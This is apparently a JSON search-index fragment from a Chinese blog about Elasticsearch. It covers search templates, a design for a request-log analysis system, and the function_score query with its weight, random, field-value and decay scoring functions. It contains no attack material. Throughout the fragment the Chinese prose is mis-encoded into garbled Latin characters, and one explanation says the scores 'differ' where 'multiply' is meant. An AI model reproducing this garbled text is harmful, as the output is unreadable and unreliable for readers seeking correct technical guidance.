æŸ¥è¯¢è¯­å¥ï¼Œåˆ°åº•ä½¿ç”¨å“ªç§ DSL åˆ™ç”±æœç´¢æ¨¡æ¿è¿›è¡Œå•ç‹¬ç®¡ç†ã€‚ ","date":"2020-11-16","objectID":"/es-search-template/:4:0","tags":["Elasticsearch"],"title":"Elasticsearch Search Template","uri":"/es-search-template/"},{"categories":["Elasticsearch"],"content":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","date":"2020-11-07","objectID":"/log-analyzer-system/","tags":["Elasticsearch"],"title":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/log-analyzer-system/"},{"categories":["Elasticsearch"],"content":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ ","date":"2020-11-07","objectID":"/log-analyzer-system/:0:0","tags":["Elasticsearch"],"title":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/log-analyzer-system/"},{"categories":["Elasticsearch"],"content":"è¯·æ±‚æ—¥å¿—è®°å½•å“ªäº›æ•°æ® time_local : è¯·æ±‚çš„æ—¶é—´ remote_addr : å®¢æˆ·ç«¯çš„ IP åœ°å€ request_method : è¯·æ±‚æ–¹æ³• request_schema : è¯·æ±‚åè®®ï¼Œå¸¸è§çš„ http å’Œ https request_host : è¯·æ±‚çš„åŸŸå request_path : è¯·æ±‚çš„ path è·¯å¾„ request_query : è¯·æ±‚çš„ query å‚æ•° request_size : è¯·æ±‚çš„å¤§å° referer : è¯·æ±‚æ¥æºåœ°å€ï¼Œå‡è®¾ä½ åœ¨ a.com ç½‘ç«™ä¸‹è´´äº† b.com çš„é“¾æ¥ï¼Œé‚£ä¹ˆå½“ç”¨æˆ·ä» a.com ç‚¹å‡»è®¿é—® b.com çš„æ—¶å€™ï¼Œreferer è®°å½•çš„å°±æ˜¯ a.com ï¼Œè¿™ä¸ªæ˜¯æµè§ˆå™¨çš„è¡Œä¸º user_agent : å®¢æˆ·ç«¯æµè§ˆå™¨ç›¸å…³ä¿¡æ¯ status : è¯·æ±‚çš„å“åº”çŠ¶æ€ request_time : è¯·æ±‚çš„è€—æ—¶ bytes_sent : å“åº”çš„å¤§å° å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šä½¿ç”¨è´Ÿè½½ç½‘å…³å»ä»£ç†è½¬å‘è¯·æ±‚ç»™å®é™…çš„åç«¯æœåŠ¡ï¼Œè¿™æ—¶å€™è¯·æ±‚æ—¥å¿—è¿˜ä¼šåŒ…æ‹¬ä»¥ä¸‹æ•°æ®ï¼š upstream_host : ä»£ç†è½¬å‘çš„ host upstream_addr : ä»£ç†è½¬å‘çš„ IP åœ°å€ upstream_url : ä»£ç†è½¬å‘ç»™æœåŠ¡çš„ url upstream_status : ä¸Šæ¸¸æœåŠ¡è¿”å›çš„ status proxy_time : ä»£ç†è½¬å‘è¿‡ç¨‹ä¸­çš„è€—æ—¶ ","date":"2020-11-07","objectID":"/log-analyzer-system/:1:0","tags":["Elasticsearch"],"title":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/log-analyzer-system/"},{"categories":["Elasticsearch"],"content":"æ•°æ®è¡ç”Ÿ å®¢æˆ·ç«¯ IP åœ°å€å¯ä»¥è¡ç”Ÿå‡ºä»¥ä¸‹æ•°æ®ï¼š asn ç›¸å…³ä¿¡æ¯ï¼š asn_asn : è‡ªæ²»ç³»ç»Ÿç¼–å·ï¼ŒIP åœ°å€æ˜¯ç”±è‡ªæ²»ç³»ç»Ÿç®¡ç†çš„ï¼Œæ¯”å¦‚ä¸­å›½è”é€šä¸Šæµ·ç½‘å°±ç®¡ç†äº†æ‰€æœ‰ä¸Šæµ·è”é€šçš„IP as_org : è‡ªæ²»ç³»ç»Ÿç»„ç»‡ï¼Œæ¯”å¦‚ä¸­å›½ç§»åŠ¨ã€ä¸­å›½è”é€š geo åœ°å€ä½ç½®ä¿¡æ¯ï¼š geo_location : ç»çº¬åº¦ geo_country : å›½å®¶ geo_country_code : å›½å®¶ç¼–ç  geo_region : åŒºåŸŸï¼ˆçœä»½ï¼‰ geo_city : åŸå¸‚ user_agent å¯ä»¥è§£æå‡ºä»¥ä¸‹ä¿¡æ¯ï¼š ua_device : ä½¿ç”¨è®¾å¤‡ ua_os : æ“ä½œç³»ç»Ÿ ua_name : æµè§ˆå™¨ ","date":"2020-11-07","objectID":"/log-analyzer-system/:2:0","tags":["Elasticsearch"],"title":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/log-analyzer-system/"},{"categories":["Elasticsearch"],"content":"æ•°æ®åˆ†æ PV / QPS : é¡µé¢æµè§ˆæ¬¡æ•° / æ¯ç§’è¯·æ±‚æ•° UV : è®¿é—®çš„ç”¨æˆ·äººæ•°ï¼Œå¾ˆå¤šç½‘ç«™ç”¨æˆ·æ— åºç™»å½•ä¹Ÿèƒ½è®¿é—®ï¼Œè¿™æ—¶å¯ä»¥æ ¹æ® IP + user_agent çš„å”¯ä¸€æ€§ç¡®å®šç”¨æˆ· IP æ•° : è®¿é—®æ¥æºæœ‰å¤šå°‘ä¸ª IP åœ°å€ ç½‘ç»œæµé‡ : æ ¹æ® request_size è¯·æ±‚çš„å¤§å°è®¡æ•°ç½‘ç»œæµå…¥æµé‡ï¼Œbytes_sent å“åº”å¤§å°è®¡ç®—ç½‘ç»œæµå‡ºæµé‡ referer æ¥æºåˆ†æ å®¢æˆ·è¯·æ±‚çš„åœ°ç†ä½ç½®åˆ†æï¼šæ ¹æ® IP åœ°å€è¡ç”Ÿçš„ geo æ•°æ® å®¢æˆ·è®¾å¤‡åˆ†æï¼šæ ¹æ® user_agent æå–æ•°æ® è¯·æ±‚è€—æ—¶ç»Ÿè®¡ï¼šæ ¹æ® request_time æ•°æ® p99ã€p95ã€p90 å»¶è¿Ÿï¼ˆå‰å¤šå°‘ç™¾åˆ†æ¯”è¯·æ±‚çš„è€—æ—¶ï¼Œæ¯”å¦‚ p99 å°±æ˜¯å‰ 99% è¯·æ±‚çš„è€—æ—¶ï¼‰ é•¿è€—æ—¶å¼‚å¸¸ç›‘æ§ å“åº”çŠ¶æ€ç›‘æ§ï¼šæ ¹æ® status æ•°æ® å„ä¸ªçŠ¶æ€ç çš„å“åº”å æ¯” 5xx æœåŠ¡ç«¯å¼‚å¸¸æ•°é‡ ç»“åˆä¸šåŠ¡åˆ†æï¼šè¯·æ±‚çš„ request_path åœ°å€å’Œ request_query å‚æ•°ä¸€å®šæ˜¯å¯¹åº”å…·ä½“ä¸šåŠ¡çš„ï¼Œä¾‹å¦‚ è¯·æ±‚æŸä¸ªç›¸å†Œçš„åœ°å€æ˜¯ /album/:id ï¼Œé‚£ä¹ˆæ—¥å¿—ä¸­çš„ request_path å¯¹åº”çš„å°±æ˜¯å¯¹ç›¸å†Œè¿›è¡Œäº†ä¸€æ¬¡è®¿é—® è¿›è¡Œç«™å†…æœç´¢çš„åœ°å€æ˜¯ /search?q=\u003cå…³é”®è¯\u003e ï¼Œé‚£ä¹ˆç»Ÿè®¡ request_path æ˜¯ /search çš„æ—¥å¿—æ¡æ•°å°±å¯ä»¥çŸ¥é“è¿›è¡Œäº†å¤šå°‘æ¬¡æœç´¢ï¼Œç»Ÿè®¡ request_query ä¸­ q çš„å‚æ•°å°±å¯ä»¥çŸ¥é“æœç´¢å…³é”®è¯çš„æƒ…å†µ ","date":"2020-11-07","objectID":"/log-analyzer-system/:3:0","tags":["Elasticsearch"],"title":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/log-analyzer-system/"},{"categories":["Elasticsearch"],"content":"é€šç”¨æ¶æ„ æ—¥å¿—ç³»ç»Ÿä½¿ç”¨ ELK + kafka æ„å»ºæ˜¯ä¸šç•Œæ¯”è¾ƒä¸»æµçš„æ–¹æ¡ˆï¼Œbeatsã€ logstash è¿›è¡Œæ—¥å¿—é‡‡é›†æ¬è¿ï¼Œkafka å­˜å‚¨æ—¥å¿—ç­‰å¾…æ¶ˆè´¹ï¼Œelasticsearch è¿›è¡Œæ•°æ®çš„èšåˆåˆ†æï¼Œgrafana å’Œ kibana è¿›è¡Œå›¾å½¢åŒ–å±•ç¤ºã€‚ ","date":"2020-11-07","objectID":"/log-analyzer-system/:4:0","tags":["Elasticsearch"],"title":"æ„é€ è¯·æ±‚æ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/log-analyzer-system/"},{"categories":["Elasticsearch"],"content":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","date":"2020-11-02","objectID":"/es-function-score-query/","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query Elasticsearch ä¼šä¸º query çš„æ¯ä¸ªæ–‡æ¡£è®¡ç®—ä¸€ä¸ªç›¸å…³åº¦å¾—åˆ† score ï¼Œå¹¶é»˜è®¤æŒ‰ç…§ score ä»é«˜åˆ°ä½çš„é¡ºåºè¿”å›æœç´¢ç»“æœã€‚ åœ¨å¾ˆå¤šåœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬ä¸ä»…éœ€è¦æœç´¢åˆ°åŒ¹é…çš„ç»“æœï¼Œè¿˜éœ€è¦èƒ½å¤ŸæŒ‰ç…§æŸç§æ–¹å¼å¯¹æœç´¢ç»“æœé‡æ–°æ‰“åˆ†æ’åºã€‚ä¾‹å¦‚ï¼š æœç´¢å…·æœ‰æŸä¸ªå…³é”®è¯çš„æ–‡æ¡£ï¼ŒåŒæ—¶è€ƒè™‘åˆ°æ–‡æ¡£çš„æ—¶æ•ˆæ€§è¿›è¡Œç»¼åˆæ’åºã€‚ æœç´¢æŸä¸ªæ—…æ¸¸æ™¯ç‚¹é™„è¿‘çš„é…’åº—ï¼ŒåŒæ—¶æ ¹æ®è·ç¦»è¿œè¿‘å’Œä»·æ ¼ç­‰å› ç´ ç»¼åˆæ’åºã€‚ æœç´¢æ ‡é¢˜åŒ…å« elasticsearch çš„æ–‡ç« ï¼ŒåŒæ—¶æ ¹æ®æµè§ˆæ¬¡æ•°å’Œç‚¹èµæ•°è¿›è¡Œç»¼åˆæ’åºã€‚ Function score query å°±å¯ä»¥è®©æˆ‘ä»¬å®ç°å¯¹æœ€ç»ˆ score çš„è‡ªå®šä¹‰æ‰“åˆ†ã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:0:0","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"score è‡ªå®šä¹‰æ‰“åˆ†è¿‡ç¨‹ ä¸ºäº†è¡Œæ–‡æ–¹ä¾¿ï¼Œæœ¬æ–‡æŠŠ ES å¯¹ query åŒ¹é…çš„æ–‡æ¡£è¿›è¡Œæ‰“åˆ†å¾—åˆ°çš„ score è®°ä¸º query_score ï¼Œè€Œæœ€ç»ˆæœç´¢ç»“æœçš„ score è®°ä¸º result_score ï¼Œæ˜¾ç„¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ˆä¹Ÿå°±æ˜¯ä¸ä½¿ç”¨è‡ªå®šä¹‰æ‰“åˆ†æ—¶ï¼‰ï¼Œresult_score å°±æ˜¯ query_score ã€‚ é‚£ä¹ˆå½“æˆ‘ä»¬ä½¿ç”¨äº†è‡ªå®šä¹‰æ‰“åˆ†ä¹‹åå‘¢ï¼Ÿæœ€ç»ˆç»“æœçš„ score å³ result_score çš„è®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š è·ŸåŸæ¥ä¸€æ ·æ‰§è¡Œ query å¹¶ä¸”å¾—åˆ°åŸæ¥çš„ query_score ã€‚ æ‰§è¡Œè®¾ç½®çš„è‡ªå®šä¹‰æ‰“åˆ†å‡½æ•°ï¼Œå¹¶ä¸ºæ¯ä¸ªæ–‡æ¡£å¾—åˆ°ä¸€ä¸ªæ–°çš„åˆ†æ•°ï¼Œæœ¬æ–‡è®°ä¸º func_score ã€‚ æœ€ç»ˆç»“æœçš„åˆ†æ•° result_score ç­‰äº query_score ä¸ func_score æŒ‰æŸç§æ–¹å¼è®¡ç®—çš„ç»“æœï¼ˆé»˜è®¤æ˜¯ç›¸ä¹˜ï¼‰ã€‚ ä¾‹å¦‚ï¼Œæœç´¢æ ‡é¢˜åŒ…å« elasticsearch çš„æ–‡æ¡£ã€‚ ä¸ä½¿ç”¨è‡ªå®šä¹‰æ‰“åˆ†ï¼Œåˆ™æœç´¢å½¢å¦‚ï¼š GET /_search { \"query\": { \"match\": { \"title\": \"elasticsearch\" } } } å‡è®¾æˆ‘ä»¬æœ€ç»ˆå¾—åˆ°äº†ä¸‰ä¸ªæœç´¢ç»“æœï¼Œscore åˆ†åˆ«æ˜¯ 0.3ã€0.2ã€0.1 ã€‚ ä½¿ç”¨è‡ªå®šä¹‰æ‰“åˆ†ï¼Œå³ function_score ï¼Œåˆ™è¯­æ³•å½¢å¦‚ï¼š GET /_search { \"query\": { \"function_score\": { \"query\": { \"match\": { \"title\": \"elasticsearch\" } } \u003c!-- è®¾ç½®è‡ªå®šä¹‰æ‰“åˆ†å‡½æ•°ï¼Œè¿™é‡Œå…ˆçœç•¥ï¼Œåé¢å†å±•å¼€è®²è§£ --\u003e \"boost_mode\": \"multiply\" } } } æœ€ç»ˆæœç´¢ç»“æœ score çš„è®¡ç®—è¿‡ç¨‹å°±æ˜¯ï¼š æ‰§è¡Œ query å¾—åˆ°åŸå§‹çš„åˆ†æ•°ï¼Œä¸ä¸Šæ–‡å‡è®¾å¯¹åº”ï¼Œå³ query_score åˆ†åˆ«æ˜¯ 0.3ã€0.2ã€0.1 ã€‚ æ‰§è¡Œè‡ªå®šä¹‰çš„æ‰“åˆ†å‡½æ•°ï¼Œè¿™ä¸€æ­¥ä¼šä¸ºæ¯ä¸ªæ–‡æ¡£å¾—åˆ°ä¸€ä¸ªæ–°çš„åˆ†æ•°ï¼Œå‡è®¾æ–°çš„åˆ†æ•°å³ func_score åˆ†åˆ«æ˜¯ 1ã€3ã€5 ã€‚ æœ€ç»ˆç»“æœçš„ score åˆ†æ•°å³ result_score = query_score * func_score ï¼Œå¯¹åº”å‡è®¾çš„ä¸‰ä¸ªæœç´¢ç»“æœæœ€ç»ˆçš„ score åˆ†åˆ«å°±æ˜¯ 0.3 * 1 = 0.3 ã€0.2 * 3 = 0.6ã€0.1 * 5 = 0.5 ï¼Œè‡³æ­¤æˆ‘ä»¬å®Œæˆäº†æ–°çš„æ‰“åˆ†è¿‡ç¨‹ï¼Œè€Œæœç´¢ç»“æœä¹Ÿä¼šæŒ‰ç…§æœ€ç»ˆçš„ score é™åºæ’åˆ—ã€‚ æœ€ç»ˆçš„åˆ†æ•° result_score æ˜¯ç”± query_score ä¸ func_score è¿›è¡Œè®¡ç®—è€Œæ¥ï¼Œè®¡ç®—æ–¹å¼ç”±å‚æ•° boost_mode å®šä¹‰ï¼š multiply : ç›¸ä¹˜ï¼ˆé»˜è®¤ï¼‰ï¼Œresult_score = query_score * function_score replace : æ›¿æ¢ï¼Œresult_score = function_score sum : ç›¸åŠ ï¼Œresult_score = query_score + function_score avg : å–ä¸¤è€…çš„å¹³å‡å€¼ï¼Œresult_score = Avg(query_score, function_score) max : å–ä¸¤è€…ä¹‹ä¸­çš„æœ€å¤§å€¼ï¼Œresult_score = Max(query_score, function_score) min : å–ä¸¤è€…ä¹‹ä¸­çš„æœ€å°å€¼ï¼Œresult_score = Min(query_score, function_score) æœ¬æ–‡è¯»åˆ°è¿™ï¼Œä½ åº”è¯¥å·²ç»å¯¹è‡ªå®šä¹‰æ‰“åˆ†çš„è¿‡ç¨‹æœ‰äº†ä¸€ä¸ªåŸºæœ¬å°è±¡ï¼ˆquery åŸå§‹åˆ†æ•°ã€è‡ªå®šä¹‰å‡½æ•°å¾—åˆ†ã€æœ€ç»ˆç»“æœ score )ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå…³é”®ç‚¹æ²¡è®²ï¼Œå³æ€ä¹ˆè®¾ç½®è‡ªå®šä¹‰æ‰“åˆ†å‡½æ•°ï¼Ÿ ","date":"2020-11-02","objectID":"/es-function-score-query/:1:0","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"function_score æ‰“åˆ†å‡½æ•° function_score æä¾›äº†ä»¥ä¸‹å‡ ç§æ‰“åˆ†çš„å‡½æ•°ï¼š weight : åŠ æƒã€‚ random_score : éšæœºæ‰“åˆ†ã€‚ field_value_factor : ä½¿ç”¨å­—æ®µçš„æ•°å€¼å‚ä¸è®¡ç®—åˆ†æ•°ã€‚ decay_function : è¡°å‡å‡½æ•° gauss, linear, exp ç­‰ã€‚ script_score : è‡ªå®šä¹‰è„šæœ¬ã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:2:0","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"weight weight åŠ æƒï¼Œä¹Ÿå°±æ˜¯ç»™æ¯ä¸ªæ–‡æ¡£ä¸€ä¸ªæƒé‡å€¼ã€‚ ç¤ºä¾‹ï¼š { \"query\": { \"function_score\": { \"query\": { \"match\": { \"message\": \"elasticsearch\" } }, \"weight\": 5 } } } ä¾‹å­ä¸­çš„ weight æ˜¯ 5 ï¼Œå³è‡ªå®šä¹‰å‡½æ•°å¾—åˆ† func_score = 5 ï¼Œæœ€ç»ˆç»“æœçš„ score ç­‰äº query_score * 5 ã€‚ å½“ç„¶è¿™ä¸ªç¤ºä¾‹å°†åŒ¹é…é¡¹å…¨éƒ¨åŠ æƒå¹¶ä¸ä¼šæ”¹å˜æœç´¢ç»“æœé¡ºåºï¼Œæˆ‘ä»¬å†çœ‹ä¸€ä¸ªä¾‹å­ï¼š { \"query\": { \"function_score\": { \"query\": { \"match\": { \"message\": \"elasticsearch\" } }, \"functions\": [ { \"filter\": { \"match\": { \"title\": \"elasticsearch\" } }, \"weight\": 5 } ] } } } æˆ‘ä»¬å¯ä»¥é€šè¿‡ filter å»é™åˆ¶ weight çš„ä½œç”¨èŒƒå›´ï¼Œå¦å¤–æˆ‘ä»¬å¯ä»¥åœ¨ functions ä¸­åŒæ—¶ä½¿ç”¨å¤šä¸ªæ‰“åˆ†å‡½æ•°ã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:2:1","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"random_score random_score éšæœºæ‰“åˆ†ï¼Œç”Ÿæˆ [0, 1) ä¹‹é—´å‡åŒ€åˆ†å¸ƒçš„éšæœºåˆ†æ•°å€¼ã€‚ ç¤ºä¾‹ï¼š GET /_search { \"query\": { \"function_score\": { \"random_score\": {} } } } è™½ç„¶æ˜¯éšæœºå€¼ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦éšæœºå€¼ä¿æŒä¸€è‡´ï¼Œæ¯”å¦‚æ‰€æœ‰ç”¨æˆ·éƒ½éšæœºäº§ç”Ÿæœç´¢ç»“æœï¼Œä½†æ˜¯åŒä¸€ä¸ªç”¨æˆ·çš„éšæœºç»“æœå‰åä¿æŒä¸€è‡´ï¼Œè¿™æ—¶åªéœ€è¦ä¸ºåŒä¸€ä¸ªç”¨æˆ·æŒ‡å®šç›¸åŒçš„ seed å³å¯ã€‚ ç¤ºä¾‹ï¼š { \"query\": { \"function_score\": { \"random_score\": { \"seed\": 10, \"field\": \"_seq_no\" } } } } é»˜è®¤æƒ…å†µä¸‹ï¼Œå³ä¸è®¾ç½® field æ—¶ä¼šä½¿ç”¨ Lucene doc ids ä½œä¸ºéšæœºæºå»ç”Ÿæˆéšæœºå€¼ï¼Œä½†æ˜¯è¿™ä¼šæ¶ˆè€—å¤§é‡å†…å­˜ï¼Œå®˜æ–¹å»ºè®®å¯ä»¥è®¾ç½® field ä¸º _seq_no ï¼Œä¸»è¦æ³¨æ„çš„æ˜¯ï¼Œå³ä½¿æŒ‡å®šäº†ç›¸åŒçš„ seed ï¼Œéšæœºå€¼æŸäº›æƒ…å†µä¸‹ä¹Ÿä¼šæ”¹å˜ï¼Œè¿™æ˜¯å› ä¸ºä¸€æ—¦å­—æ®µè¿›è¡Œäº†æ›´æ–°ï¼Œ_seq_no ä¹Ÿä¼šæ›´æ–°ï¼Œè¿›è€Œå¯¼è‡´éšæœºæºå‘ç”Ÿå˜åŒ–ã€‚ å¤šä¸ªå‡½æ•°ç»„åˆç¤ºä¾‹ï¼š GET /_search { \"query\": { \"function_score\": { \"query\": { \"match_all\": {} }, \"boost\": \"5\", \"functions\": [ { \"filter\": { \"match\": { \"test\": \"bar\" } }, \"random_score\": {}, \"weight\": 23 }, { \"filter\": { \"match\": { \"test\": \"cat\" } }, \"weight\": 42 } ], \"max_boost\": 42, \"score_mode\": \"max\", \"boost_mode\": \"multiply\", \"min_score\": 42 } } } ä¸Šä¾‹ functions ä¸­è®¾ç½®äº†ä¸¤ä¸ªæ‰“åˆ†å‡½æ•°ï¼š ä¸€ä¸ªæ˜¯ random_score éšæœºæ‰“åˆ†ï¼Œå¹¶ä¸” weight æ˜¯ 23 å¦ä¸€ä¸ªåªæœ‰ weight æ˜¯ 42 å‡è®¾ï¼š ç¬¬ä¸€ä¸ªå‡½æ•°éšæœºæ‰“åˆ†å¾—åˆ°äº† 0.1 ï¼Œå†ä¸ weight ç›¸ä¹˜å°±æ˜¯ 2.3 ç¬¬äºŒä¸ªå‡½æ•°åªæœ‰ weight ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°å¾—åˆ°çš„åˆ†æ•°å°±æ˜¯ weight çš„å€¼ 42 score_mode è®¾ç½®ä¸ºäº† maxï¼Œæ„æ€æ˜¯å–ä¸¤ä¸ªæ‰“åˆ†å‡½æ•°çš„æœ€å¤§å€¼ä½œä¸º func_scoreï¼Œå¯¹åº”ä¸Šè¿°å‡è®¾ä¹Ÿå°±æ˜¯ 2.3 å’Œ 42 ä¸¤è€…ä¸­çš„æœ€å¤§å€¼ï¼Œå³ func_score = 42 boost_mode è®¾ç½®ä¸ºäº† multiplyï¼Œå°±æ˜¯æŠŠåŸæ¥çš„ query_score ä¸ func_score ç›¸ä¹˜å°±å¾—åˆ°äº†æœ€ç»ˆçš„ score åˆ†æ•°ã€‚ å‚æ•° score_mode æŒ‡å®šå¤šä¸ªæ‰“åˆ†å‡½æ•°å¦‚ä½•ç»„åˆè®¡ç®—å‡ºæ–°çš„åˆ†æ•°ï¼š multiply : åˆ†æ•°ç›¸ä¹˜ï¼ˆé»˜è®¤ï¼‰ sum : ç›¸åŠ  avg : åŠ æƒå¹³å‡å€¼ first : ä½¿ç”¨ç¬¬ä¸€ä¸ª filter å‡½æ•°çš„åˆ†æ•° max : å–æœ€å¤§å€¼ min : å–æœ€å°å€¼ ä¸ºäº†é¿å…æ–°çš„åˆ†æ•°çš„æ•°å€¼è¿‡é«˜ï¼Œå¯ä»¥é€šè¿‡ max_boost å‚æ•°å»è®¾ç½®ä¸Šé™ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šä¸è®ºæˆ‘ä»¬æ€ä¹ˆè‡ªå®šä¹‰æ‰“åˆ†ï¼Œéƒ½ä¸ä¼šæ”¹å˜åŸå§‹ query çš„åŒ¹é…è¡Œä¸ºï¼Œæˆ‘ä»¬è‡ªå®šä¹‰æ‰“åˆ†ï¼Œéƒ½æ˜¯åœ¨åŸå§‹ query æŸ¥è¯¢ç»“æŸåï¼Œå¯¹æ¯ä¸€ä¸ªåŒ¹é…çš„æ–‡æ¡£è¿›è¡Œé‡æ–°ç®—åˆ†ã€‚ ä¸ºäº†æ’é™¤æ‰ä¸€äº›åˆ†æ•°å¤ªä½çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ min_score å‚æ•°è®¾ç½®æœ€å°åˆ†æ•°é˜ˆå€¼ã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:2:2","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"field_value_factor field_value_factor ä½¿ç”¨å­—æ®µçš„æ•°å€¼å‚ä¸è®¡ç®—åˆ†æ•°ã€‚ ä¾‹å¦‚ä½¿ç”¨ likes ç‚¹èµæ•°å­—æ®µè¿›è¡Œç»¼åˆæœç´¢ï¼š { \"query\": { \"function_score\": { \"query\": { \"match\": { \"message\": \"elasticsearch\" } }, \"field_value_factor\": { \"field\": \"likes\", \"factor\": 1.2, \"missing\": 1, \"modifier\": \"log1p\" } } } } è¯´æ˜ï¼š field : å‚ä¸è®¡ç®—çš„å­—æ®µã€‚ factor : ä¹˜ç§¯å› å­ï¼Œé»˜è®¤ä¸º 1 ï¼Œå°†ä¼šä¸ field çš„å­—æ®µå€¼ç›¸ä¹˜ã€‚ missing : å¦‚æœ field å­—æ®µä¸å­˜åœ¨åˆ™ä½¿ç”¨ missing æŒ‡å®šçš„ç¼ºçœå€¼ã€‚ modifier : è®¡ç®—å‡½æ•°ï¼Œä¸ºäº†é¿å…åˆ†æ•°ç›¸å·®è¿‡å¤§ï¼Œç”¨äºå¹³æ»‘åˆ†æ•°ï¼Œå¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š none : ä¸å¤„ç†ï¼Œé»˜è®¤ log : log(factor * field_value) log1p : log(1 + factor * field_value) log2p : log(2 + factor * field_value) ln : ln(factor * field_value) ln1p : ln(1 + factor * field_value) ln2p : ln(2 + factor * field_value) square : å¹³æ–¹ï¼Œ(factor * field_value)^2 sqrt : å¼€æ–¹ï¼Œsqrt(factor * field_value) reciprocal : æ±‚å€’æ•°ï¼Œ1/(factor * field_value) å‡è®¾æŸä¸ªåŒ¹é…çš„æ–‡æ¡£çš„ç‚¹èµæ•°æ˜¯ 1000 ï¼Œé‚£ä¹ˆä¾‹å­ä¸­å…¶æ‰“åˆ†å‡½æ•°ç”Ÿæˆçš„åˆ†æ•°å°±æ˜¯ log(1 + 1.2 * 1000)ï¼Œæœ€ç»ˆçš„åˆ†æ•°æ˜¯åŸæ¥çš„ query åˆ†æ•°ä¸æ­¤æ‰“åˆ†å‡½æ•°åˆ†æ•°ç›¸å·®çš„ç»“æœã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:2:3","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"decay_function decay_function è¡°å‡å‡½æ•°ï¼Œä¾‹å¦‚ï¼š ä»¥æŸä¸ªæ•°å€¼ä½œä¸ºä¸­å¿ƒç‚¹ï¼Œè·ç¦»å¤šå°‘çš„èŒƒå›´ä¹‹å¤–é€æ¸è¡°å‡ï¼ˆç¼©å°åˆ†æ•°ï¼‰ ä»¥æŸä¸ªæ—¥æœŸä½œä¸ºä¸­å¿ƒç‚¹ï¼Œè·ç¦»å¤šä¹…çš„èŒƒå›´ä¹‹å¤–é€æ¸è¡°å‡ï¼ˆç¼©å°åˆ†æ•°ï¼‰ ä»¥æŸä¸ªåœ°ç†ä½ç½®ç‚¹ä½œä¸ºä¸­å¿ƒç‚¹ï¼Œæ–¹åœ†å¤šå°‘è·ç¦»ä¹‹å¤–é€æ¸è¡°å‡ï¼ˆç¼©å°åˆ†æ•°ï¼‰ ç¤ºä¾‹ï¼š \"DECAY_FUNCTION\": { \"FIELD_NAME\": { \"origin\": \"30, 120\", \"scale\": \"2km\", \"offset\": \"0km\", \"decay\": 0.33 } } ä¸Šä¾‹çš„æ„æ€å°±æ˜¯åœ¨è·ä¸­å¿ƒç‚¹æ–¹åœ† 2 å…¬é‡Œä¹‹å¤–ï¼Œåˆ†æ•°å‡å°‘åˆ°ä¸‰åˆ†ä¹‹ä¸€ï¼ˆä¹˜ä»¥ decay çš„å€¼ 0.33ï¼‰ã€‚ DECAY_FUNCTION å¯ä»¥æ˜¯ä»¥ä¸‹ä»»æ„ä¸€ç§å‡½æ•°ï¼š linear : çº¿æ€§å‡½æ•° exp : æŒ‡æ•°å‡½æ•° gauss : é«˜æ–¯å‡½æ•° origin : ä¸­å¿ƒç‚¹ï¼Œåªèƒ½æ˜¯æ•°å€¼ã€æ—¥æœŸã€geo-point scale : å®šä¹‰åˆ°ä¸­å¿ƒç‚¹çš„è·ç¦» offset : åç§»é‡ï¼Œé»˜è®¤ 0 decay : è¡°å‡æŒ‡æ•°ï¼Œé»˜è®¤æ˜¯ 0.5 ç¤ºä¾‹ï¼š GET /_search { \"query\": { \"function_score\": { \"gauss\": { \"@timestamp\": { \"origin\": \"2013-09-17\", \"scale\": \"10d\", \"offset\": \"5d\", \"decay\": 0.5 } } } } } ä¸­å¿ƒç‚¹æ˜¯ 2013-09-17 æ—¥æœŸï¼Œscale æ˜¯ 10d æ„å‘³ç€æ—¥æœŸèŒƒå›´æ˜¯ 2013-09-12 åˆ° 2013-09-22 çš„æ–‡æ¡£åˆ†æ•°æƒé‡æ˜¯ 1 ï¼Œæ—¥æœŸåœ¨ scale + offset = 15d ä¹‹å¤–çš„æ–‡æ¡£æƒé‡æ˜¯ 0.5 ã€‚ 